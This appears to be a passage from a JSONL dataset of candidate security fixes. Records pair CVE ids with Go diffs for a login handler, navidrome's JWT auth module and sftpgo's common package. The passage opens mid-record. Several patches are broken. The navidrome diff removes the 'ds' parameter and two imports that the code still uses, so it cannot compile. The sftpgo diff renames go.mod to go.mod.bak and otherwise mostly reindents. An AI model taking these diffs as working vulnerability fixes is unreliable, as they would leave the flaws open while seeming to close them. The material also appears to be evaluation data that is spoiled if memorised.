messageAuthenticationFailed)\n \n-\t\tprovider, err := ctx.GetSessionProvider()\n-\t\tif err != nil {\n-\t\t\tctx.Logger.WithError(err).Error(\"Failed to get session provider during 1FA attempt\")\n+return\n+}\n \n-\t\t\trespondUnauthorized(ctx, messageAuthenticationFailed)\n+if !userPasswordOk {\n+_ = markAuthenticationAttempt(ctx, false, nil, username, regulation.AuthType1FA, nil)\n \n-\t\t\treturn\n-\t\t}\n+respondUnauthorized(ctx, messageAuthenticationFailed)\n \n-\t\tuserSession, err := provider.GetSession(ctx.RequestCtx)\n-\t\tif err != nil {\n-\t\t\tctx.Logger.Errorf(\"%s\", err)\n+return\n+}\n \n-\t\t\trespondUnauthorized(ctx, messageAuthenticationFailed)\n+if err = markAuthenticationAttempt(ctx, true, nil, username, regulation.AuthType1FA, nil); err != nil {\n+respondUnauthorized(ctx, messageAuthenticationFailed)\n \n-\t\t\treturn\n-\t\t}\n+return\n+}\n \n-\t\tnewSession := provider.NewDefaultUserSession()\n+provider, err := ctx.GetSessionProvider()\n+if err != nil {\n+ctx.Logger.WithError(err).Error(\"Failed to get session provider during 1FA attempt\")\n \n-\t\t// Reset all values from previous session except OIDC workflow before regenerating the cookie.\n-\t\tif err = ctx.SaveSession(newSession); err != nil {\n-\t\t\tctx.Logger.WithError(err).Errorf(logFmtErrSessionReset, regulation.AuthType1FA, bodyJSON.Username)\n+respondUnauthorized(ctx, messageAuthenticationFailed)\n \n-\t\t\trespondUnauthorized(ctx, messageAuthenticationFailed)\n+return\n+}\n \n-\t\t\treturn\n-\t\t}\n+userSession, err := provider.GetSession(ctx.RequestCtx)\n+if err != nil {\n+ctx.Logger.Errorf(\"%s\", err)\n \n-\t\tif err = ctx.RegenerateSession(); err != nil {\n-\t\t\tctx.Logger.WithError(err).Errorf(logFmtErrSessionRegenerate, regulation.AuthType1FA, bodyJSON.Username)\n+respondUnauthorized(ctx, messageAuthenticationFailed)\n \n-\t\t\trespondUnauthorized(ctx, messageAuthenticationFailed)\n+return\n+}\n \n-\t\t\treturn\n-\t\t}\n+newSession := provider.NewDefaultUserSession()\n \n-\t\t// Check if bodyJSON.KeepMeLoggedIn can be deref'd and derive the value based on the configuration and JSON data.\n-\t\tkeepMeLoggedIn := !provider.Config.DisableRememberMe && bodyJSON.KeepMeLoggedIn != nil && *bodyJSON.KeepMeLoggedIn\n+// Reset all values from previous session except OIDC workflow before regenerating the cookie.\n+if err = ctx.SaveSession(newSession); err != nil {\n+ctx.Logger.WithError(err).Errorf(logFmtErrSessionReset, regulation.AuthType1FA, username)\n \n-\t\t// Set the cookie to expire if remember me is enabled and the user has asked us to.\n-\t\tif keepMeLoggedIn {\n-\t\t\terr = provider.UpdateExpiration(ctx.RequestCtx, provider.Config.RememberMe)\n-\t\t\tif err != nil {\n-\t\t\t\tctx.Logger.WithError(err).Errorf(logFmtErrSessionSave, \"updated expiration\", regulation.AuthType1FA, logFmtActionAuthentication, bodyJSON.Username)\n+respondUnauthorized(ctx, messageAuthenticationFailed)\n \n-\t\t\t\trespondUnauthorized(ctx, messageAuthenticationFailed)\n+return\n+}\n \n-\t\t\t\treturn\n-\t\t\t}\n-\t\t}\n+if err = ctx.RegenerateSession(); err != nil {\n+ctx.Logger.WithError(err).Errorf(logFmtErrSessionRegenerate, regulation.AuthType1FA, username)\n \n-\t\t// Get the details of the given user from the user provider.\n-\t\tuserDetails, err := ctx.Providers.UserProvider.GetDetails(bodyJSON.Username)\n-\t\tif err != nil {\n-\t\t\tctx.Logger.WithError(err).Errorf(logFmtErrObtainProfileDetails, regulation.AuthType1FA, bodyJSON.Username)\n+respondUnauthorized(ctx, messageAuthenticationFailed)\n \n-\t\t\trespondUnauthorized(ctx, messageAuthenticationFailed)\n+return\n+}\n \n-\t\t\treturn\n-\t\t}\n+// Check if bodyJSON.KeepMeLoggedIn can be deref'd and derive the value based on the configuration and JSON data.\n+keepMeLoggedIn := !provider.Config.DisableRememberMe && bodyJSON.KeepMeLoggedIn != nil && *bodyJSON.KeepMeLoggedIn\n \n-\t\tctx.Logger.Tracef(logFmtTraceProfileDetails, bodyJSON.Username, userDetails.Groups, userDetails.Emails)\n+// Set the cookie to expire if remember me is enabled and the user has asked us to.\n+if keepMeLoggedIn {\n+err = provider.UpdateExpiration(ctx.RequestCtx, provider.Config.RememberMe)\n+if err != nil {\n+ctx.Logger.WithError(err).Errorf(logFmtErrSessionSave, \"updated expiration\", regulation.AuthType1FA, logFmtActionAuthentication, username)\n \n-\t\tuserSession.SetOneFactor(ctx.Clock.Now(), userDetails, keepMeLoggedIn)\n+respondUnauthorized(ctx, messageAuthenticationFailed)\n \n-\t\tif ctx.Configuration.AuthenticationBackend.RefreshInterval.Update() {\n-\t\t\tuserSession.RefreshTTL = ctx.Clock.Now().Add(ctx.Configuration.AuthenticationBackend.RefreshInterval.Value())\n-\t\t}\n+return\n+}\n+}\n \n-\t\tif err = ctx.SaveSession(userSession); err != nil {\n-\t\t\tctx.Logger.WithError(err).Errorf(logFmtErrSessionSave, \"updated profile\", regulation.AuthType1FA, logFmtActionAuthentication, bodyJSON.Username)\n+ctx.Logger.Tracef(logFmtTraceProfileDetails, username, userDetails.Groups, userDetails.Emails)\n \n-\t\t\trespondUnauthorized(ctx, messageAuthenticationFailed)\n+userSession.SetOneFactor(ctx.Clock.Now(), *userDetails, keepMeLoggedIn)\n+\n+if ctx.Configuration.AuthenticationBackend.RefreshInterval.Update() {\n+userSession.RefreshTTL = ctx.Clock.Now().Add(ctx.Configuration.AuthenticationBackend.RefreshInterval.Value())\n+}\n \n-\t\t\treturn\n-\t\t}\n+if err = ctx.SaveSession(userSession); err != nil {\n+ctx.Logger.WithError(err).Errorf(logFmtErrSessionSave, \"updated profile\", regulation.AuthType1FA, logFmtActionAuthentication, username)\n \n-\t\tsuccessful = true\n+respondUnauthorized(ctx, messageAuthenticationFailed)\n \n-\t\tif bodyJSON.Workflow == workflowOpenIDConnect {\n-\t\t\thandleOIDCWorkflowResponse(ctx, &userSession, bodyJSON.TargetURL, bodyJSON.WorkflowID)\n-\t\t} else {\n-\t\t\tHandle1FAResponse(ctx, bodyJSON.TargetURL, bodyJSON.RequestMethod, userSession.Username, userSession.Groups)\n-\t\t}\n-\t}\n+return\n+}\n+\n+successful = true\n+\n+if bodyJSON.Workflow == workflowOpenIDConnect {\n+handleOIDCWorkflowResponse(ctx, &userSession, bodyJSON.TargetURL, bodyJSON.WorkflowID)\n+} else {\n+Handle1FAResponse(ctx, bodyJSON.TargetURL, bodyJSON.RequestMethod, userSession.Username, userSession.Groups)\n+}\n+        }\n }\n"}
{"cve":"CVE-2024-56362:0708", "fix_patch": "diff --git a/core/auth/auth.go b/core/auth/auth.go\nindex 7725de8d6..b854388d6 100644\n--- a/core/auth/auth.go\n+++ b/core/auth/auth.go\n@@ -1,114 +1,112 @@\n package auth\n \n import (\n-\t\"context\"\n-\t\"sync\"\n-\t\"time\"\n-\n-\t\"github.com/go-chi/jwtauth/v5\"\n-\t\"github.com/google/uuid\"\n-\t\"github.com/lestrrat-go/jwx/v2/jwt\"\n-\t\"github.com/navidrome/navidrome/conf\"\n-\t\"github.com/navidrome/navidrome/consts\"\n-\t\"github.com/navidrome/navidrome/log\"\n-\t\"github.com/navidrome/navidrome/model\"\n-\t\"github.com/navidrome/navidrome/model/request\"\n+        \"context\"\n+        \"sync\"\n+        \"time\"\n+\n+        \"github.com/go-chi/jwtauth/v5\"\n+        \"github.com/google/uuid\"\n+        \"github.com/lestrrat-go/jwx/v2/jwt\"\n+        \"github.com/navidrome/navidrome/conf\"\n+        \"github.com/navidrome/navidrome/log\"\n+        \"github.com/navidrome/navidrome/model\"\n )\n \n var (\n-\tonce      sync.Once\n-\tSecret    []byte\n-\tTokenAuth *jwtauth.JWTAuth\n+        once      sync.Once\n+        Secret    []byte\n+        TokenAuth *jwtauth.JWTAuth\n )\n \n-func Init(ds model.DataStore) {\n-\tonce.Do(func() {\n-\t\tlog.Info(\"Setting Session Timeout\", \"value\", conf.Server.SessionTimeout)\n-\t\tsecret, err := ds.Property(context.TODO()).Get(consts.JWTSecretKey)\n-\t\tif err != nil || secret == \"\" {\n-\t\t\tlog.Error(\"No JWT secret found in DB. Setting a temp one, but please report this error\", err)\n-\t\t\tsecret = uuid.NewString()\n-\t\t}\n-\t\tSecret = []byte(secret)\n-\t\tTokenAuth = jwtauth.New(\"HS256\", Secret, nil)\n-\t})\n+func Init() {\n+        once.Do(func() {\n+                log.Info(\"Setting Session Timeout\", \"value\", conf.Server.SessionTimeout)\n+                secret, err := ds.Property(context.TODO()).Get(consts.JWTSecretKey)\n+                if err != nil || secret == \"\" {\n+                        log.Error(\"No JWT secret found in DB. Setting a temp one, but please report this error\", err)\n+                        secret = uuid.NewString()\n+                }\n+                Secret = []byte(secret)\n+                TokenAuth = jwtauth.New(\"HS256\", Secret, nil)\n+        })\n }\n \n func createBaseClaims() map[string]any {\n-\ttokenClaims := map[string]any{}\n-\ttokenClaims[jwt.IssuerKey] = consts.JWTIssuer\n-\treturn tokenClaims\n+        tokenClaims := map[string]any{}\n+        tokenClaims[jwt.IssuerKey] = \"navidrome\"\n+        return tokenClaims\n }\n \n func CreatePublicToken(claims map[string]any) (string, error) {\n-\ttokenClaims := createBaseClaims()\n-\tfor k, v := range claims {\n-\t\ttokenClaims[k] = v\n-\t}\n-\t_, token, err := TokenAuth.Encode(tokenClaims)\n+        tokenClaims := createBaseClaims()\n+        for k, v := range claims {\n+                tokenClaims[k] = v\n+        }\n+        _, token, err := TokenAuth.Encode(tokenClaims)\n \n-\treturn token, err\n+        return token, err\n }\n \n func CreateExpiringPublicToken(exp time.Time, claims map[string]any) (string, error) {\n-\ttokenClaims := createBaseClaims()\n-\tif !exp.IsZero() {\n-\t\ttokenClaims[jwt.ExpirationKey] = exp.UTC().Unix()\n-\t}\n-\tfor k, v := range claims {\n-\t\ttokenClaims[k] = v\n-\t}\n-\t_, token, err := TokenAuth.Encode(tokenClaims)\n-\n-\treturn token, err\n+        tokenClaims := createBaseClaims()\n+        if !exp.IsZero() {\n+                tokenClaims[jwt.ExpirationKey] = exp.UTC().Unix()\n+        }\n+        for k, v := range claims {\n+                tokenClaims[k] = v\n+        }\n+        _, token, err := TokenAuth.Encode(tokenClaims)\n+\n+        return token, err\n }\n \n func CreateToken(u *model.User) (string, error) {\n-\tclaims := createBaseClaims()\n-\tclaims[jwt.SubjectKey] = u.UserName\n-\tclaims[jwt.IssuedAtKey] = time.Now().UTC().Unix()\n-\tclaims[\"uid\"] = u.ID\n-\tclaims[\"adm\"] = u.IsAdmin\n-\ttoken, _, err := TokenAuth.Encode(claims)\n-\tif err != nil {\n-\t\treturn \"\", err\n-\t}\n-\n-\treturn TouchToken(token)\n+        claims := createBaseClaims()\n+        claims[jwt.SubjectKey] = u.UserName\n+        claims[jwt.IssuedAtKey] = time.Now().UTC().Unix()\n+        claims[\"uid\"] = u.ID\n+        claims[\"adm\"] = u.IsAdmin\n+        token, _, err := TokenAuth.Encode(claims)\n+        if err != nil {\n+                return \"\", err\n+        }\n+\n+        return TouchToken(token)\n }\n \n func TouchToken(token jwt.Token) (string, error) {\n-\tclaims, err := token.AsMap(context.Background())\n-\tif err != nil {\n-\t\treturn \"\", err\n-\t}\n+        claims, err := token.AsMap(context.Background())\n+        if err != nil {\n+                return \"\", err\n+        }\n \n-\tclaims[jwt.ExpirationKey] = time.Now().UTC().Add(conf.Server.SessionTimeout).Unix()\n-\t_, newToken, err := TokenAuth.Encode(claims)\n+        claims[jwt.ExpirationKey] = time.Now().UTC().Add(conf.Server.SessionTimeout).Unix()\n+        _, newToken, err := TokenAuth.Encode(claims)\n \n-\treturn newToken, err\n+        return newToken, err\n }\n \n func Validate(tokenStr string) (map[string]interface{}, error) {\n-\ttoken, err := jwtauth.VerifyToken(TokenAuth, tokenStr)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn token.AsMap(context.Background())\n+        token, err := jwtauth.VerifyToken(TokenAuth, tokenStr)\n+        if err != nil {\n+                return nil, err\n+        }\n+        return token.AsMap(context.Background())\n }\n \n func WithAdminUser(ctx context.Context, ds model.DataStore) context.Context {\n-\tu, err := ds.User(ctx).FindFirstAdmin()\n-\tif err != nil {\n-\t\tc, err := ds.User(ctx).CountAll()\n-\t\tif c == 0 && err == nil {\n-\t\t\tlog.Debug(ctx, \"Scanner: No admin user yet!\", err)\n-\t\t} else {\n-\t\t\tlog.Error(ctx, \"Scanner: No admin user found!\", err)\n-\t\t}\n-\t\tu = &model.User{}\n-\t}\n-\n-\tctx = request.WithUsername(ctx, u.UserName)\n-\treturn request.WithUser(ctx, *u)\n+        u, err := ds.User(ctx).FindFirstAdmin()\n+        if err != nil {\n+                c, err := ds.User(ctx).CountAll()\n+                if c == 0 && err == nil {\n+                        log.Debug(ctx, \"Scanner: No admin user yet!\", err)\n+                } else {\n+                        log.Error(ctx, \"Scanner: No admin user found!\", err)\n+                }\n+                u = &model.User{}\n+        }\n+\n+        ctx = request.WithUsername(ctx, u.UserName)\n+        return request.WithUser(ctx, *u)\n }\n"}
{"cve":"CVE-2024-52309:0708", "fix_patch": "diff --git a/go.mod b/go.mod.bak\nsimilarity index 100%\nrename from go.mod\nrename to go.mod.bak\ndiff --git a/internal/common/common.go b/internal/common/common.go\nindex 0cbc0ec5..b3d4cff9 100644\n--- a/internal/common/common.go\n+++ b/internal/common/common.go\n@@ -16,300 +16,300 @@\n package common\n \n import (\n-\t\"context\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"net\"\n-\t\"net/http\"\n-\t\"net/url\"\n-\t\"os\"\n-\t\"os/exec\"\n-\t\"path/filepath\"\n-\t\"slices\"\n-\t\"strconv\"\n-\t\"strings\"\n-\t\"sync\"\n-\t\"sync/atomic\"\n-\t\"time\"\n-\n-\t\"github.com/pires/go-proxyproto\"\n-\t\"github.com/sftpgo/sdk/plugin/notifier\"\n-\n-\t\"github.com/drakkan/sftpgo/v2/internal/command\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/dataprovider\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/httpclient\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/logger\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/metric\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/plugin\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/smtp\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/util\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/version\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/vfs\"\n+        \"context\"\n+        \"errors\"\n+        \"fmt\"\n+        \"net\"\n+        \"net/http\"\n+        \"net/url\"\n+        \"os\"\n+        \"os/exec\"\n+        \"path/filepath\"\n+        \"slices\"\n+        \"strconv\"\n+        \"strings\"\n+        \"sync\"\n+        \"sync/atomic\"\n+        \"time\"\n+\n+        \"github.com/pires/go-proxyproto\"\n+        \"github.com/sftpgo/sdk/plugin/notifier\"\n+\n+        \"github.com/drakkan/sftpgo/v2/internal/command\"\n+        \"github.com/drakkan/sftpgo/v2/internal/dataprovider\"\n+        \"github.com/drakkan/sftpgo/v2/internal/httpclient\"\n+        \"github.com/drakkan/sftpgo/v2/internal/logger\"\n+        \"github.com/drakkan/sftpgo/v2/internal/metric\"\n+        \"github.com/drakkan/sftpgo/v2/internal/plugin\"\n+        \"github.com/drakkan/sftpgo/v2/internal/smtp\"\n+        \"github.com/drakkan/sftpgo/v2/internal/util\"\n+        \"github.com/drakkan/sftpgo/v2/internal/version\"\n+        \"github.com/drakkan/sftpgo/v2/internal/vfs\"\n )\n \n // constants\n const (\n-\tlogSender              = \"common\"\n-\tuploadLogSender        = \"Upload\"\n-\tdownloadLogSender      = \"Download\"\n-\trenameLogSender        = \"Rename\"\n-\trmdirLogSender         = \"Rmdir\"\n-\tmkdirLogSender         = \"Mkdir\"\n-\tsymlinkLogSender       = \"Symlink\"\n-\tremoveLogSender        = \"Remove\"\n-\tchownLogSender         = \"Chown\"\n-\tchmodLogSender         = \"Chmod\"\n-\tchtimesLogSender       = \"Chtimes\"\n-\tcopyLogSender          = \"Copy\"\n-\ttruncateLogSender      = \"Truncate\"\n-\toperationDownload      = \"download\"\n-\toperationUpload        = \"upload\"\n-\toperationFirstDownload = \"first-download\"\n-\toperationFirstUpload   = \"first-upload\"\n-\toperationDelete        = \"delete\"\n-\toperationCopy          = \"copy\"\n-\t// Pre-download action name\n-\tOperationPreDownload = \"pre-download\"\n-\t// Pre-upload action name\n-\tOperationPreUpload = \"pre-upload\"\n-\toperationPreDelete = \"pre-delete\"\n-\toperationRename    = \"rename\"\n-\toperationMkdir     = \"mkdir\"\n-\toperationRmdir     = \"rmdir\"\n-\t// SSH command action name\n-\tOperationSSHCmd              = \"ssh_cmd\"\n-\tchtimesFormat                = \"2006-01-02T15:04:05\" // YYYY-MM-DDTHH:MM:SS\n-\tidleTimeoutCheckInterval     = 3 * time.Minute\n-\tperiodicTimeoutCheckInterval = 1 * time.Minute\n+        logSender              = \"common\"\n+        uploadLogSender        = \"Upload\"\n+        downloadLogSender      = \"Download\"\n+        renameLogSender        = \"Rename\"\n+        rmdirLogSender         = \"Rmdir\"\n+        mkdirLogSender         = \"Mkdir\"\n+        symlinkLogSender       = \"Symlink\"\n+        removeLogSender        = \"Remove\"\n+        chownLogSender         = \"Chown\"\n+        chmodLogSender         = \"Chmod\"\n+        chtimesLogSender       = \"Chtimes\"\n+        copyLogSender          = \"Copy\"\n+        truncateLogSender      = \"Truncate\"\n+        operationDownload      = \"download\"\n+        operationUpload        = \"upload\"\n+        operationFirstDownload = \"first-download\"\n+        operationFirstUpload   = \"first-upload\"\n+        operationDelete        = \"delete\"\n+        operationCopy          = \"copy\"\n+        // Pre-download action name\n+        OperationPreDownload = \"pre-download\"\n+        // Pre-upload action name\n+        OperationPreUpload = \"pre-upload\"\n+        operationPreDelete = \"pre-delete\"\n+        operationRename    = \"rename\"\n+        operationMkdir     = \"mkdir\"\n+        operationRmdir     = \"rmdir\"\n+        // SSH command action name\n+        OperationSSHCmd              = \"ssh_cmd\"\n+        chtimesFormat                = \"2006-01-02T15:04:05\" // YYYY-MM-DDTHH:MM:SS\n+        idleTimeoutCheckInterval     = 3 * time.Minute\n+        periodicTimeoutCheckInterval = 1 * time.Minute\n )\n \n // Stat flags\n const (\n-\tStatAttrUIDGID = 1\n-\tStatAttrPerms  = 2\n-\tStatAttrTimes  = 4\n-\tStatAttrSize   = 8\n+        StatAttrUIDGID = 1\n+        StatAttrPerms  = 2\n+        StatAttrTimes  = 4\n+        StatAttrSize   = 8\n )\n \n // Transfer types\n const (\n-\tTransferUpload = iota\n-\tTransferDownload\n+        TransferUpload = iota\n+        TransferDownload\n )\n \n // Supported protocols\n const (\n-\tProtocolSFTP          = \"SFTP\"\n-\tProtocolSCP           = \"SCP\"\n-\tProtocolSSH           = \"SSH\"\n-\tProtocolFTP           = \"FTP\"\n-\tProtocolWebDAV        = \"DAV\"\n-\tProtocolHTTP          = \"HTTP\"\n-\tProtocolHTTPShare     = \"HTTPShare\"\n-\tProtocolDataRetention = \"DataRetention\"\n-\tProtocolOIDC          = \"OIDC\"\n-\tprotocolEventAction   = \"EventAction\"\n+        ProtocolSFTP          = \"SFTP\"\n+        ProtocolSCP           = \"SCP\"\n+        ProtocolSSH           = \"SSH\"\n+        ProtocolFTP           = \"FTP\"\n+        ProtocolWebDAV        = \"DAV\"\n+        ProtocolHTTP          = \"HTTP\"\n+        ProtocolHTTPShare     = \"HTTPShare\"\n+        ProtocolDataRetention = \"DataRetention\"\n+        ProtocolOIDC          = \"OIDC\"\n+        protocolEventAction   = \"EventAction\"\n )\n \n // Upload modes\n const (\n-\tUploadModeStandard              = 0\n-\tUploadModeAtomic                = 1\n-\tUploadModeAtomicWithResume      = 2\n-\tUploadModeS3StoreOnError        = 4\n-\tUploadModeGCSStoreOnError       = 8\n-\tUploadModeAzureBlobStoreOnError = 16\n+        UploadModeStandard              = 0\n+        UploadModeAtomic                = 1\n+        UploadModeAtomicWithResume      = 2\n+        UploadModeS3StoreOnError        = 4\n+        UploadModeGCSStoreOnError       = 8\n+        UploadModeAzureBlobStoreOnError = 16\n )\n \n func init() {\n-\tConnections.clients = clientsMap{\n-\t\tclients: make(map[string]int),\n-\t}\n-\tConnections.transfers = clientsMap{\n-\t\tclients: make(map[string]int),\n-\t}\n-\tConnections.perUserConns = make(map[string]int)\n-\tConnections.mapping = make(map[string]int)\n-\tConnections.sshMapping = make(map[string]int)\n+        Connections.clients = clientsMap{\n+                clients: make(map[string]int),\n+        }\n+        Connections.transfers = clientsMap{\n+                clients: make(map[string]int),\n+        }\n+        Connections.perUserConns = make(map[string]int)\n+        Connections.mapping = make(map[string]int)\n+        Connections.sshMapping = make(map[string]int)\n }\n \n // errors definitions\n var (\n-\tErrPermissionDenied  = errors.New(\"permission denied\")\n-\tErrNotExist          = errors.New(\"no such file or directory\")\n-\tErrOpUnsupported     = errors.New(\"operation unsupported\")\n-\tErrGenericFailure    = errors.New(\"failure\")\n-\tErrQuotaExceeded     = errors.New(\"denying write due to space limit\")\n-\tErrReadQuotaExceeded = errors.New(\"denying read due to quota limit\")\n-\tErrConnectionDenied  = errors.New(\"you are not allowed to connect\")\n-\tErrNoBinding         = errors.New(\"no binding configured\")\n-\tErrCrtRevoked        = errors.New(\"your certificate has been revoked\")\n-\tErrNoCredentials     = errors.New(\"no credential provided\")\n-\tErrInternalFailure   = errors.New(\"internal failure\")\n-\tErrTransferAborted   = errors.New(\"transfer aborted\")\n-\tErrShuttingDown      = errors.New(\"the service is shutting down\")\n-\terrNoTransfer        = errors.New(\"requested transfer not found\")\n-\terrTransferMismatch  = errors.New(\"transfer mismatch\")\n+        ErrPermissionDenied  = errors.New(\"permission denied\")\n+        ErrNotExist          = errors.New(\"no such file or directory\")\n+        ErrOpUnsupported     = errors.New(\"operation unsupported\")\n+        ErrGenericFailure    = errors.New(\"failure\")\n+        ErrQuotaExceeded     = errors.New(\"denying write due to space limit\")\n+        ErrReadQuotaExceeded = errors.New(\"denying read due to quota limit\")\n+        ErrConnectionDenied  = errors.New(\"you are not allowed to connect\")\n+        ErrNoBinding         = errors.New(\"no binding configured\")\n+        ErrCrtRevoked        = errors.New(\"your certificate has been revoked\")\n+        ErrNoCredentials     = errors.New(\"no credential provided\")\n+        ErrInternalFailure   = errors.New(\"internal failure\")\n+        ErrTransferAborted   = errors.New(\"transfer aborted\")\n+        ErrShuttingDown      = errors.New(\"the service is shutting down\")\n+        errNoTransfer        = errors.New(\"requested transfer not found\")\n+        errTransferMismatch  = errors.New(\"transfer mismatch\")\n )\n \n var (\n-\t// Config is the configuration for the supported protocols\n-\tConfig Configuration\n-\t// Connections is the list of active connections\n-\tConnections ActiveConnections\n-\t// QuotaScans is the list of active quota scans\n-\tQuotaScans         ActiveScans\n-\ttransfersChecker   TransfersChecker\n-\tsupportedProtocols = []string{ProtocolSFTP, ProtocolSCP, ProtocolSSH, ProtocolFTP, ProtocolWebDAV,\n-\t\tProtocolHTTP, ProtocolHTTPShare, ProtocolOIDC}\n-\tdisconnHookProtocols = []string{ProtocolSFTP, ProtocolSCP, ProtocolSSH, ProtocolFTP}\n-\t// the map key is the protocol, for each protocol we can have multiple rate limiters\n-\trateLimiters     map[string][]*rateLimiter\n-\tisShuttingDown   atomic.Bool\n-\tftpLoginCommands = []string{\"PASS\", \"USER\"}\n-\tfnUpdateBranding func(*dataprovider.BrandingConfigs)\n+        // Config is the configuration for the supported protocols\n+        Config Configuration\n+        // Connections is the list of active connections\n+        Connections ActiveConnections\n+        // QuotaScans is the list of active quota scans\n+        QuotaScans         ActiveScans\n+        transfersChecker   TransfersChecker\n+        supportedProtocols = []string{ProtocolSFTP, ProtocolSCP, ProtocolSSH, ProtocolFTP, ProtocolWebDAV,\n+                ProtocolHTTP, ProtocolHTTPShare, ProtocolOIDC}\n+        disconnHookProtocols = []string{ProtocolSFTP, ProtocolSCP, ProtocolSSH, ProtocolFTP}\n+        // the map key is the protocol, for each protocol we can have multiple rate limiters\n+        rateLimiters     map[string][]*rateLimiter\n+        isShuttingDown   atomic.Bool\n+        ftpLoginCommands = []string{\"PASS\", \"USER\"}\n+        fnUpdateBranding func(*dataprovider.BrandingConfigs)\n )\n \n // SetUpdateBrandingFn sets the function to call to update branding configs.\n func SetUpdateBrandingFn(fn func(*dataprovider.BrandingConfigs)) {\n-\tfnUpdateBranding = fn\n+        fnUpdateBranding = fn\n }\n \n // Initialize sets the common configuration\n func Initialize(c Configuration, isShared int) error {\n-\tisShuttingDown.Store(false)\n-\tutil.SetUmask(c.Umask)\n-\tversion.SetConfig(c.ServerVersion)\n-\tdataprovider.SetTZ(c.TZ)\n-\tConfig = c\n-\tConfig.Actions.ExecuteOn = util.RemoveDuplicates(Config.Actions.ExecuteOn, true)\n-\tConfig.Actions.ExecuteSync = util.RemoveDuplicates(Config.Actions.ExecuteSync, true)\n-\tConfig.ProxyAllowed = util.RemoveDuplicates(Config.ProxyAllowed, true)\n-\tConfig.idleLoginTimeout = 2 * time.Minute\n-\tConfig.idleTimeoutAsDuration = time.Duration(Config.IdleTimeout) * time.Minute\n-\tstartPeriodicChecks(periodicTimeoutCheckInterval, isShared)\n-\tConfig.defender = nil\n-\tConfig.allowList = nil\n-\tConfig.rateLimitersList = nil\n-\trateLimiters = make(map[string][]*rateLimiter)\n-\tfor _, rlCfg := range c.RateLimitersConfig {\n-\t\tif rlCfg.isEnabled() {\n-\t\t\tif err := rlCfg.validate(); err != nil {\n-\t\t\t\treturn fmt.Errorf(\"rate limiters initialization error: %w\", err)\n-\t\t\t}\n-\t\t\trateLimiter := rlCfg.getLimiter()\n-\t\t\tfor _, protocol := range rlCfg.Protocols {\n-\t\t\t\trateLimiters[protocol] = append(rateLimiters[protocol], rateLimiter)\n-\t\t\t}\n-\t\t}\n-\t}\n-\tif len(rateLimiters) > 0 {\n-\t\trateLimitersList, err := dataprovider.NewIPList(dataprovider.IPListTypeRateLimiterSafeList)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"unable to initialize ratelimiters list: %w\", err)\n-\t\t}\n-\t\tConfig.rateLimitersList = rateLimitersList\n-\t}\n-\tif c.DefenderConfig.Enabled {\n-\t\tif !slices.Contains(supportedDefenderDrivers, c.DefenderConfig.Driver) {\n-\t\t\treturn fmt.Errorf(\"unsupported defender driver %q\", c.DefenderConfig.Driver)\n-\t\t}\n-\t\tvar defender Defender\n-\t\tvar err error\n-\t\tswitch c.DefenderConfig.Driver {\n-\t\tcase DefenderDriverProvider:\n-\t\t\tdefender, err = newDBDefender(&c.DefenderConfig)\n-\t\tdefault:\n-\t\t\tdefender, err = newInMemoryDefender(&c.DefenderConfig)\n-\t\t}\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"defender initialization error: %v\", err)\n-\t\t}\n-\t\tlogger.Info(logSender, \"\", \"defender initialized with config %+v\", c.DefenderConfig)\n-\t\tConfig.defender = defender\n-\t}\n-\tif c.AllowListStatus > 0 {\n-\t\tallowList, err := dataprovider.NewIPList(dataprovider.IPListTypeAllowList)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"unable to initialize the allow list: %w\", err)\n-\t\t}\n-\t\tlogger.Info(logSender, \"\", \"allow list initialized\")\n-\t\tConfig.allowList = allowList\n-\t}\n-\tif err := c.initializeProxyProtocol(); err != nil {\n-\t\treturn err\n-\t}\n-\tvfs.SetTempPath(c.TempPath)\n-\tdataprovider.SetTempPath(c.TempPath)\n-\tvfs.SetAllowSelfConnections(c.AllowSelfConnections)\n-\tvfs.SetRenameMode(c.RenameMode)\n-\tvfs.SetReadMetadataMode(c.Metadata.Read)\n-\tvfs.SetResumeMaxSize(c.ResumeMaxSize)\n-\tvfs.SetUploadMode(c.UploadMode)\n-\tdataprovider.SetAllowSelfConnections(c.AllowSelfConnections)\n-\ttransfersChecker = getTransfersChecker(isShared)\n-\treturn nil\n+        isShuttingDown.Store(false)\n+        util.SetUmask(c.Umask)\n+        version.SetConfig(c.ServerVersion)\n+        dataprovider.SetTZ(c.TZ)\n+        Config = c\n+        Config.Actions.ExecuteOn = util.RemoveDuplicates(Config.Actions.ExecuteOn, true)\n+        Config.Actions.ExecuteSync = util.RemoveDuplicates(Config.Actions.ExecuteSync, true)\n+        Config.ProxyAllowed = util.RemoveDuplicates(Config.ProxyAllowed, true)\n+        Config.idleLoginTimeout = 2 * time.Minute\n+        Config.idleTimeoutAsDuration = time.Duration(Config.IdleTimeout) * time.Minute\n+        startPeriodicChecks(periodicTimeoutCheckInterval, isShared)\n+        Config.defender = nil\n+        Config.allowList = nil\n+        Config.rateLimitersList = nil\n+        rateLimiters = make(map[string][]*rateLimiter)\n+        for _, rlCfg := range c.RateLimitersConfig {\n+                if rlCfg.isEnabled() {\n+                        if err := rlCfg.validate(); err != nil {\n+                                return fmt.Errorf(\"rate limiters initialization error: %w\", err)\n+                        }\n+                        rateLimiter := rlCfg.getLimiter()\n+                        for _, protocol := range rlCfg.Protocols {\n+                                rateLimiters[protocol] = append(rateLimiters[protocol], rateLimiter)\n+                        }\n+                }\n+        }\n+        if len(rateLimiters) > 0 {\n+                rateLimitersList, err := dataprovider.NewIPList(dataprovider.IPListTypeRateLimiterSafeList)\n+                if err != nil {\n+                        return fmt.Errorf(\"unable to initialize ratelimiters list: %w\", err)\n+                }\n+                Config.rateLimitersList = rateLimitersList\n+        }\n+        if c.DefenderConfig.Enabled {\n+                if !slices.Contains(supportedDefenderDrivers, c.DefenderConfig.Driver) {\n+                        return fmt.Errorf(\"unsupported defender driver %q\", c.DefenderConfig.Driver)\n+                }\n+                var 